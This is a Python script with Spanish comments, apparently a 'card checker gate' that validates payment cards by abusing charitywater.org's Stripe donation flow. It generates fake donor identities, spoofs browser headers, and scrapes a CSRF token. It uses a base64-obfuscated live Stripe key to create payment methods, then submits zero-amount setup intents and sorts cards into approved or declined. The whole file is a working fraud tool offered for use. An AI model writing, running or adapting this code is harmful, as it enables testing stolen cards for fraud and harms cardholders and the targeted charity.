import re
import requests
import random
import json
import base64
from datetime import datetime
from urllib.parse import urlencode

def _d(s):
    """Decodifica string base64"""
    return base64.b64decode(s).decode('utf-8')

def parse_between_strings(data, source, start, end, case_sensitive=True, default="", regex_escape=False, use_regex=False):
    """Extrae texto entre dos delimitadores"""
    try:
        if not case_sensitive:
            source = source.lower()
            start = start.lower()
            end = end.lower()
        
        if use_regex:
            pattern = f"{re.escape(start) if regex_escape else start}(.*?){re.escape(end) if regex_escape else end}"
            match = re.search(pattern, source, re.DOTALL)
            return match.group(1) if match else default
        else:
            start_idx = source.find(start)
            if start_idx == -1:
                return default
            start_idx += len(start)
            end_idx = source.find(end, start_idx)
            if end_idx == -1:
                return default
            return source[start_idx:end_idx]
    except Exception as e:
        return default

def to_lowercase(data, string):
    """Convierte string a minúsculas"""
    return string.lower()

def check_condition(source, comparison, value):
    """Verifica si una condición se cumple"""
    if comparison == 'Contains':
        return value in source.lower()
    return False

def verify_stripe_auth(card_number, exp_month, exp_year, cvv, user_agent=None):
    """
    Verifica una tarjeta usando Stripe Auth (charitywater.org)
    
    Este gate usa SetupIntent (Auth mode) para verificar tarjetas sin cargo.
    Utiliza el sitio charitywater.org que implementa Stripe con validación 3D Secure.
    
    Args:
        card_number: Número de tarjeta (sin espacios)
        exp_month: Mes de expiración (MM)
        exp_year: Año de expiración (YYYY o YY)
        cvv: Código CVV
        user_agent: User-Agent opcional (se genera uno si no se proporciona)
    
    Returns:
        dict con:
            - success: bool
            - status: str ('approved', 'declined', 'error')
            - message: str
            - details: dict con información adicional de la tarjeta
    """
    try:
        # Generar user-agent si no se proporciona
        if not user_agent:
            try:
                from fake_useragent import UserAgent
                ua = UserAgent()
                user_agent = ua.random
            except:
                user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        
        data = {}
        card = {
            'cc': card_number,
            'month': exp_month,
            'year': exp_year,
            'cvv': cvv
        }
        
        # Paso 1: Obtener datos de usuario aleatorio desde randomuser.me
        data['ExecutingBlock'] = "Http Request - Random User"
        r = requests.Session()
        
        response = r.get(
            'https://randomuser.me/api/',
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.8'
            },
            timeout=15
        )
        
        data['SOURCE'] = response.text
        
        # Paso 2: Asignar user agent
        data['ExecutingBlock'] = "User Agent Setup"
        data['id'] = user_agent
        
        # Paso 3: Parsear datos del usuario aleatorio
        data['ExecutingBlock'] = "Parse User Data"
        first = parse_between_strings(data, data.get('SOURCE', ''), '{"title":"Mr","first":"', '",', True, "", "", False)
        data['first'] = first or 'John'
        
        last = parse_between_strings(data, data.get('SOURCE', ''), '"last":"', '"},', True, "", "", False)
        data['last'] = last or 'Doe'
        
        street = parse_between_strings(data, data.get('SOURCE', ''), ',"name":"', '"},', True, "", "", False)
        data['street'] = street or '123 Main St'
        
        city = parse_between_strings(data, data.get('SOURCE', ''), ',"city":"', '",', True, "", "", False)
        data['city'] = city or 'New York'
        
        state = parse_between_strings(data, data.get('SOURCE', ''), ',"state":"', '",', True, "", "", False)
        data['state'] = state or 'NY'
        
        zip_code = parse_between_strings(data, data.get('SOURCE', ''), '"postcode":', ',"', True, "", "", False)
        data['zip'] = zip_code or '10001'
        
        phone = parse_between_strings(data, data.get('SOURCE', ''), '"phone":"', '",', True, "", "", False)
        data['phone'] = phone or '5551234567'
        
        email = parse_between_strings(data, data.get('SOURCE', ''), ',"email":"', '",', True, "", "", False)
        data['email'] = email or f'test{random.randint(1000, 9999)}@gmail.com'
        
        country = parse_between_strings(data, data.get('SOURCE', ''), ',"nat":"', '"}]', True, "", "", False)
        data['country'] = country or 'US'
        
        # Paso 4: Obtener página de charitywater y CSRF token
        data['ExecutingBlock'] = "Http Request - Charity Water Homepage"
        response = r.get(
            'https://www.charitywater.org/',
            headers={
                'Host': 'www.charitywater.org',
                'User-Agent': data['id'],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://www.google.com/',
                'Connection': 'keep-alive',
                'Cookie': 'countrypreference=US',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i'
            },
            cookies={'countrypreference': 'US'},
            timeout=15
        )
        
        data['SOURCE'] = response.text
        
        # Paso 5: Parsear CSRF token
        data['ExecutingBlock'] = "Parse CSRF Token"
        csrf = parse_between_strings(data, data.get('SOURCE', ''), '<meta name="csrf-token" content="', '" />', True, "", "", False)
        data['csrf'] = csrf or ''
        
        # Paso 6: Crear payment method en Stripe API
        data['ExecutingBlock'] = "Http Request - Stripe Payment Method Creation"
        content = urlencode({
            'type': 'card',
            'billing_details[address][postal_code]': data.get('zip', ''),
            'billing_details[address][city]': data.get('city', ''),
            'billing_details[address][country]': data.get('country', ''),
            'billing_details[address][line1]': data.get('street', ''),
            'billing_details[email]': data.get('email', ''),
            'billing_details[name]': data.get('last', ''),
            'card[number]': card['cc'],
            'card[cvc]': card['cvv'],
            'card[exp_month]': card['month'],
            'card[exp_year]': card['year'],
            'guid': ''.join(random.choices('0123456789abcdef', k=32)),
            'muid': ''.join(random.choices('0123456789abcdef', k=32)),
            'sid': ''.join(random.choices('0123456789abcdef', k=32)),
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/6cb3d73f56; stripe-js-v3/6cb3d73f56; card-element',
            'referrer': 'https://www.charitywater.org',
            'time_on_page': str(random.randint(30000, 40000)),
            'client_attribution_metadata[client_session_id]': ''.join(random.choices('0123456789abcdef', k=32)),
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
            'client_attribution_metadata[merchant_integration_version]': '2017',
            'key': _d('cGtfbGl2ZV81MTA0OUhtNFFGYUd5Y2dSS09JYnVwUnc3cmY2NUZKRVNtUHFXWms5SnRwZjJZQ3Z4bmpNQUZYN2RPUEFnb3h2OU0yd3doaTVPd0ZCeDFFenVvVHhOekxKRDAwVmlCYk12a1E=')
        })
        
        response = r.post(
            'https://api.stripe.com/v1/payment_methods',
            headers={
                'Host': 'api.stripe.com',
                'User-Agent': data['id'],
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'Priority': 'u=4'
            },
            data=content,
            timeout=15
        )
        
        # Paso 7: Parsear respuesta de Stripe
        data['ExecutingBlock'] = "Parse Stripe Response"
        stripe_response = response.text
        stripe_response_lower = stripe_response.lower()
        data['stripe_response'] = stripe_response
        
        # Verificar si Stripe devolvió un error al crear payment_method
        if '"error":' in stripe_response_lower:
            error_type = parse_between_strings(data, stripe_response, '"type":"', '"', True, "", "", False)
            error_code = parse_between_strings(data, stripe_response, '"code":"', '"', True, "", "", False)
            error_message = parse_between_strings(data, stripe_response, '"message":"', '"', True, "", "", False)
            
            # Detectar errores específicos de tarjeta vs errores de cuenta
            if 'live charges' in error_message.lower() or 'account cannot' in error_message.lower():
                # Error de cuenta del merchant, no de la tarjeta
                return {
                    'success': False,
                    'status': 'error',
                    'message': 'Merchant account error - Gateway temporarily unavailable',
                    'details': {
                        'error_code': 'merchant_account_error',
                        'error_type': 'account_restriction',
                        'note': 'This is a merchant issue, not a card issue'
                    }
                }
            
            return {
                'success': False,
                'status': 'declined',
                'message': error_message or f'Card Error: {error_code or error_type or "Payment method creation failed"}',
                'details': {
                    'error_code': error_code,
                    'error_type': error_type,
                    'response': stripe_response[:500]
                }
            }
        
        stripe_id = parse_between_strings(data, stripe_response, '"id": "', '",', True, "", "", False)
        
        # Si no hay stripe_id, la creación del payment method falló
        if not stripe_id:
            return {
                'success': False,
                'status': 'declined',
                'message': 'Failed to create payment method - Invalid card data',
                'details': {'response': stripe_response[:500]}
            }
        
        data['stripe_id'] = stripe_id
        
        # Extraer información de la tarjeta desde la respuesta de Stripe
        try:
            stripe_data = json.loads(stripe_response)
            card_info = stripe_data.get('card', {})
            bin_number = card_info.get('fingerprint', '')[:6] if card_info.get('fingerprint') else card_number[:6]
        except:
            bin_number = card_number[:6] if len(card_number) >= 6 else ''
        
        # Paso 8: Convertir país a minúsculas
        data['ExecutingBlock'] = "Country Lowercase"
        c = to_lowercase(data, data.get('country', 'us'))
        data['c'] = c
        
        # Paso 9: Realizar setup intent en charitywater (Auth mode - sin cargo)
        data['ExecutingBlock'] = "Http Request - Charity Water Auth Setup"
        content = urlencode({
            'country': data.get('c', 'us'),
            'payment_intent[email]': data.get('email', ''),
            'payment_intent[amount]': '0',  # Auth mode - sin cargo
            'payment_intent[currency]': 'usd',
            'payment_intent[metadata][donation_kind]': 'water',
            'payment_intent[payment_method]': data.get('stripe_id', ''),
            'payment_intent[setup_future_usage]': 'off_session',
            'disable_existing_subscription_check': 'false',
            'donation_form[amount]': '0',
            'donation_form[anonymous]': 'true',
            'donation_form[comment]': '',
            'donation_form[display_name]': '',
            'donation_form[email]': data.get('email', ''),
            'donation_form[name]': data.get('last', ''),
            'donation_form[payment_gateway_token]': '',
            'donation_form[payment_monthly_subscription]': 'false',  # No suscripción para auth
            'donation_form[surname]': data.get('first', ''),
            'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
            'donation_form[setup_intent_id]': '',
            'donation_form[subscription_period]': 'monthly',
            'donation_form[metadata][donation_kind]': 'water',
            'donation_form[metadata][email_consent_granted]': 'false',
            'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/',
            'donation_form[metadata][phone_number]': '',
            'donation_form[metadata][plaid_account_id]': '',
            'donation_form[metadata][plaid_public_token]': '',
            'donation_form[metadata][uk_eu_ip]': 'false',
            'donation_form[metadata][url_params][touch_type]': '1',
            'donation_form[metadata][session_url_params][touch_type]': '1',
            'donation_form[metadata][with_saved_payment]': 'false',
            'donation_form[address][address_line_1]': data.get('street', ''),
            'donation_form[address][address_line_2]': '',
            'donation_form[address][city]': data.get('city', ''),
            'donation_form[address][country]': '',
            'donation_form[address][zip]': data.get('zip', ''),
            'subscription[amount]': '0',
            'subscription[country]': 'us',
            'subscription[email]': data.get('email', ''),
            'subscription[full_name]': data.get('last', ''),
            'subscription[is_annual]': 'false'
        })
        
        response = r.post(
            'https://www.charitywater.org/donate/stripe',
            headers={
                'Host': 'www.charitywater.org',
                'User-Agent': data['id'],
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://www.charitywater.org/',
                'X-Csrf-Token': data.get('csrf', ''),
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://www.charitywater.org',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin'
            },
            data=content,
            timeout=15
        )
        
        # Paso 10: Procesar respuesta final
        data['ExecutingBlock'] = "Parse Final Response"
        source = response.text
        source_lower = source.lower()
        
        # Verificar errores de cuenta del merchant PRIMERO
        if 'live charges' in source_lower or ('account cannot' in source_lower and 'make live' in source_lower):
            return {
                'success': False,
                'status': 'error',
                'message': 'Merchant gateway error - Service temporarily unavailable',
                'details': {
                    'error_code': 'merchant_restriction',
                    'note': 'The merchant account has restrictions. This is not a card issue.',
                    'response': source[:300]
                }
            }
        
        # Verificar respuesta de Stripe en la creación del payment method
        stripe_response_saved = data.get('stripe_response', '')
        stripe_id_valid = data.get('stripe_id', '')
        
        # Intentar parsear mensaje de error/éxito
        message = parse_between_strings(data, source, '"message":"', '"', True, "", "", False)
        
        # Filtrar falsos positivos de redirectUrl
        if message and message.lower() in ['url', 'redirecturl', 'redirect']:
            message = ''
        
        # Si no se encontró mensaje, intentar parseo alternativo
        if not message:
            temp_msg = parse_between_strings(data, source, '{"message":"', '",', True, "", "", False)
            if temp_msg and temp_msg.lower() not in ['url', 'redirecturl', 'redirect']:
                message = temp_msg
        
        # Si aún no hay mensaje, intentar obtener descripción del error
        if not message:
            message = parse_between_strings(data, source, '"error":{"message":"', '"', True, "", "", False)
        
        data['Message'] = message
        
        # Palabras clave de RECHAZO (más prioritarias)
        decline_keywords = [
            'your card was declined',
            'incorrect_number',
            'card_declined',
            'decline_code',
            'your card does not support this type of purchase',
            'insufficient funds',
            'insufficient_funds',
            'card was declined',
            'declined',
            'generic_decline',
            'do_not_honor',
            'lost_card',
            'stolen_card',
            'expired_card',
            'incorrect_cvc',
            'processing_error',
            'card_not_supported',
            'invalid_number',
            'invalid_cvc',
            'invalid_expiry_month',
            'invalid_expiry_year',
            'payment_intent_payment_attempt_failed',
            'payment_method_unactivated'
        ]
        
        # Verificar si fue rechazada
        if any(check_condition(source_lower, 'Contains', keyword) for keyword in decline_keywords):
            return {
                'success': False,
                'status': 'declined',
                'message': message or 'Card Declined ✗',
                'details': {
                    'response': source[:500],
                    'card': {
                        'bin': bin_number
                    }
                }
            }
        
        # Palabras clave de ÉXITO
        success_keywords = [
            'succeeded',
            'payment-success',
            'successfully',
            'thank you for your support',
            'thank you',
            'membership confirmation',
            'thank you for your payment',
            'thank you for membership',
            'payment received',
            'your order has been received',
            'purchase successful',
            'setup_intent.succeeded',
            'setup_intent.created'
        ]
        
        # Verificar si hay redirectUrl con /thank-you (indicador fuerte de éxito)
        has_redirect_success = 'redirecturl' in source_lower and '/thank-you' in source_lower
        
        # Verificar indicadores de éxito
        has_success_indicator = any(check_condition(source_lower, 'Contains', keyword) for keyword in success_keywords)
        
        # Si Stripe creó exitosamente el payment method Y (hay redirect de éxito O palabras clave de éxito)
        if stripe_id_valid and (has_redirect_success or has_success_indicator):
            # Obtener información adicional del BIN si es posible
            bin_info = None
            if bin_number and len(bin_number) >= 6:
                try:
                    bin_response = requests.get(
                        f"https://lookup.binlist.net/{bin_number[:6]}",
                        headers={'Accept-Version': '3'},
                        timeout=5
                    )
                    if bin_response.status_code == 200:
                        bin_info = bin_response.json()
                except:
                    bin_info = None
            
            return {
                'success': True,
                'status': 'approved',
                'message': 'Approved ✓ - Auth Successful (No Charge)',
                'details': {
                    'stripe_id': stripe_id_valid,
                    'card': {
                        'bin': bin_number,
                        'last4': card_number[-4:] if len(card_number) >= 4 else '',
                    },
                    'bin_info': bin_info,
                    'mode': 'auth',
                    'response': source[:500]
                }
            }
        
        # Si llegamos aquí, es probablemente un rechazo o error desconocido
        return {
            'success': False,
            'status': 'declined',
            'message': message or 'Card Declined ✗ - Auth Failed',
            'details': {
                'response': source[:500],
                'card': {
                    'bin': bin_number
                }
            }
        }
    
    except requests.exceptions.Timeout:
        return {
            'success': False,
            'status': 'error',
            'message': 'Timeout - El servidor tardó demasiado en responder',
            'details': {}
        }
    
    except requests.exceptions.RequestException as e:
        return {
            'success': False,
            'status': 'error',
            'message': f'Error de conexión: {str(e)}',
            'details': {}
        }
    
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': f'Error inesperado: {str(e)}',
            'details': {}
        }

